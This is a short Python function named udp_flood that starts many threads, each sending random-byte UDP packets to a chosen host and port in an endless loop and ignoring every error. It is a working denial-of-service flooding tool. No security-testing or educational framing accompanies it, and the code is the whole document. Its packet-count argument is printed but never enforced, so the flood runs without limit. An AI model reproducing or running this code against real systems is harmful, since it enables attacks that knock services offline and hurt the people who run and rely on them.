def udp_flood(target, port, packets, packet_size, threads):
    import threading, socket, random

    def flood():
        data = random._urandom(packet_size)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (target, port))
            except:
                pass

    print(f"[UDP] Flooding {target}:{port} with {packets} packets per thread.")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
